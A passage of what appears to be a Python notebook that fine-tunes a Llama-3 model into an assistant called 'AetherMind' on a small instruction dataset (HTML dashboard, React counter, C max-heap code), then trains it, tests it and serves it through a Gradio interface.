1fr)); gap: 20px; }\n    .card { background-color: white; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }\n    .card h3 { font-size: 14px; color: #64748b; text-transform: uppercase; margin-bottom: 8px; }\n    .card p { font-size: 28px; font-weight: 700; color: #0f172a; }\n    @media (max-width: 768px) {\n      body { flex-direction: column; }\n      .sidebar { width: 100%; height: auto; padding: 16px; }\n    }\n  </style>\n</head>\n<body>\n  <aside class=\"sidebar\">\n    <h2>AetherBoard</h2>\n    <nav>Home</nav>\n    <nav>Analytics</nav>\n  </aside>\n  <main class=\"main\">\n    <header><h1>Dashboard Overview</h1></header>\n    <div class=\"content\">\n      <div class=\"grid\">\n        <div class=\"card\"><h3>Visits</h3><p>1,240</p></div>\n        <div class=\"card\"><h3>Uptime</h3><p>99.98%</p></div>\n        <div class=\"card\"><h3>Active Issues</h3><p style=\"color: #ef4444;\">0</p></div>\n      </div>\n    </div>\n  </main>\n</body>\n</html>\n```"
  },
  {
    "instruction": "Build a Simple counter application in React.",
    "input": "",
    "output": "Here is a simple, interactive Counter application in React using the `useState` hook. It renders decrement, reset, and increment buttons.\n\n### React Component Code\n```javascript\nimport React, { useState } from 'react';\n\nexport default function Counter() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <div style={{ padding: '24px', textAlign: 'center', fontFamily: 'system-ui, sans-serif' }}>\n      <h2>React Counter</h2>\n      <div style={{ fontSize: '48px', margin: '24px 0', fontWeight: 'bold', color: '#0f172a' }}>\n        {count}\n      </div>\n      <div style={{ display: 'flex', gap: '12px', justifyContent: 'center' }}>\n        <button \n          onClick={() => setCount(count - 1)} \n          style={{ padding: '10px 20px', background: '#ef4444', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: '600' }}\n        >\n          - Decrement\n        </button>\n        <button \n          onClick={() => setCount(0)} \n          style={{ padding: '10px 20px', background: '#64748b', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: '600' }}\n        >\n          Reset\n        </button>\n        <button \n          onClick={() => setCount(count + 1)} \n          style={{ padding: '10px 20px', background: '#10b981', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: '600' }}\n        >\n          + Increment\n        </button>\n      </div>\n    </div>\n  );\n}\n```"
  },
  {
    "instruction": "Give me the C code for find the binary tree heap for 102 elements.",
    "input": "",
    "output": "If by \"binary tree heap for 102 elements\" you mean creating a **Max Heap** using 102 elements and displaying it, here's a C program that:\n\n1. Accepts 102 elements as input.\n2. Builds a Max Heap.\n3. Displays the heap in array form.\n\n### C Code\n```c\n#include <stdio.h>\n\n#define SIZE 102\n\n// Function to heapify a subtree rooted at index i\nvoid heapify(int arr[], int n, int i) {\n    int largest = i;\n    int left = 2 * i + 1;\n    int right = 2 * i + 2;\n\n    // Check left child\n    if (left < n && arr[left] > arr[largest])\n        largest = left;\n\n    // Check right child\n    if (right < n && arr[right] > arr[largest])\n        largest = right;\n\n    // If largest is not root\n    if (largest != i) {\n        int temp = arr[i];\n        arr[i] = arr[largest];\n        arr[largest] = temp;\n\n        heapify(arr, n, largest);\n    }\n}\n\n// Build a max heap from an unsorted array\nvoid buildMaxHeap(int arr[], int n) {\n    // Start from last non-leaf node and heapify each node\n    for (int i = n / 2 - 1; i >= 0; i--)\n        heapify(arr, n, i);\n}\n\nint main() {\n    int arr[SIZE];\n\n    printf(\"Enter %d elements:\\n\", SIZE);\n    for (int i = 0; i < SIZE; i++)\n        scanf(\"%d\", &arr[i]);\n\n    buildMaxHeap(arr, SIZE);\n\n    printf(\"\\nMax Heap:\\n\");\n    for (int i = 0; i < SIZE; i++)\n        printf(\"%d \", arr[i]);\n    printf(\"\\n\");\n\n    return 0;\n}\n```\n\n### Example Input\n```\n10 20 30 40 50 ...\n```\n\n### Example Output\n```\nMax Heap:\n100 95 90 80 70 ...\n```\n\n### How It Works\n- `heapify()` ensures the subtree rooted at index `i` satisfies the max heap property (parent \u2265 children).\n- `buildMaxHeap()` calls `heapify()` starting from the last non-leaf node (`n/2 - 1`) up to the root. This runs in $O(n)$ time.\n- The heap is stored in an array where for any element at index `i`, its left child is at `2*i + 1` and right child is at `2*i + 2`.\n\nIf your assignment specifically asks for:\n- **Min Heap** \u2014 change `>` to `<` in the comparison inside `heapify()`.\n- **Heap Sort using 102 elements** \u2014 add a loop that repeatedly extracts the max and re-heapifies.\n- **Displaying the heap as a binary tree structure** \u2014 use level-order traversal with indentation."
  }
]

system_prompt = "You are AetherMind, an intelligent, helpful, and precise AI assistant specializing in Mathematics, Statistics, Probability, Computer Science, Coding, Cybersecurity, and Web Development, capable of answering all general and conversational questions. Follow rules strictly: 1) Understand intent. 2) Be accurate. 3) Structure responses clearly. 4) Adapt to user style. 5) Answer whatever the user asks conversationally, directly, and professionally."

# Format the dataset for Llama-3
def format_prompts(examples):
    instructions = examples["instruction"]
    inputs       = examples["input"]
    outputs      = examples["output"]
    texts = []
    for instruction, input_text, output in zip(instructions, inputs, outputs):
        user_msg = instruction
        if input_text.strip():
            user_msg += f"\n{input_text}"
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_msg},
            {"role": "assistant", "content": output}
        ]
        text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=False)
        texts.append(text)
    return { "text" : texts }

dataset = Dataset.from_list(aethermind_data)
dataset = dataset.map(format_prompts, batched=True)
print(f"Dataset ready! {len(dataset)} training samples.")


In [ ]:
# ============================================================
# STEP 5: Train the model!
# ============================================================
from trl import SFTTrainer
from transformers import TrainingArguments
from unsloth import is_bfloat16_supported

trainer = SFTTrainer(
    model = model,
    tokenizer = tokenizer,
    train_dataset = dataset,
    dataset_text_field = "text",
    max_seq_length = 2048,
    dataset_num_proc = 2,
    packing = False,
    args = TrainingArguments(
        per_device_train_batch_size = 1,
        gradient_accumulation_steps = 8,
        warmup_steps = 5,
        max_steps = 25, # Prevent overfitting on 20-sample dataset
        learning_rate = 5e-5, # Lower learning rate to avoid catastrophic forgetting
        fp16 = not is_bfloat16_supported(),
        bf16 = is_bfloat16_supported(),
        logging_steps = 1,
        optim = "adamw_8bit",
        weight_decay = 0.01,
        lr_scheduler_type = "linear",
        seed = 3407,
        output_dir = "outputs",
    ),
)

print("Starting training...")
trainer_stats = trainer.train()
print("Training completed!")


In [ ]:
# ============================================================
# STEP 6: Quick test!
# ============================================================
FastLanguageModel.for_inference(model)

system_prompt = "You are AetherMind, an intelligent, helpful, and precise AI assistant specializing in Mathematics, Statistics, Probability, Computer Science, Coding, Cybersecurity, and Web Development, capable of answering all general and conversational questions. Follow rules strictly: 1) Understand intent. 2) Be accurate. 3) Structure responses clearly. 4) Adapt to user style. 5) Answer whatever the user asks conversationally, directly, and professionally."
messages = [
    {"role": "system", "content": system_prompt},
    {"role": "user", "content": "Explain what a probability distribution is, and give its types and standard conditions."}
]
inputs = tokenizer.apply_chat_template(
    messages, tokenize=True, add_generation_prompt=True,
    return_dict=True, return_tensors="pt"
).to("cuda")

outputs = model.generate(**inputs, max_new_tokens=256, use_cache=True)
response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
print("AI says:", response)


In [ ]:
# ============================================================
# STEP 7: Launch the Gradio server (copy the link!)
# ============================================================
import gradio as gr
import traceback

FastLanguageModel.for_inference(model)

system_prompt = "You are AetherMind, an intelligent, helpful, and precise AI assistant specializing in Mathematics, Statistics, Probability, Computer Science, Coding, Cybersecurity, and Web Development, capable of answering all general and conversational questions. Follow rules strictly: 1) Understand intent. 2) Be accurate. 3) Structure responses clearly. 4) Adapt to user style. 5) Answer whatever the user asks conversationally, directly, and professionally."

def chat(message):
    try:
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": message}
        ]
        inputs = tokenizer.apply_chat_template(
            messages, tokenize=True, add_generation_prompt=True,
            return_dict=True, return_tensors="pt"
        ).to("cuda")
        outputs = model.generate(**inputs, max_new_tokens=512, use_cache=True)
        response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
        return response
    except Exception as e:
        return f"Error: {traceback.format_exc()}"

demo = gr.Interface(fn=chat, inputs="text", outputs="text", title="AetherMind AI")
demo.launch(share=True, debug=True)
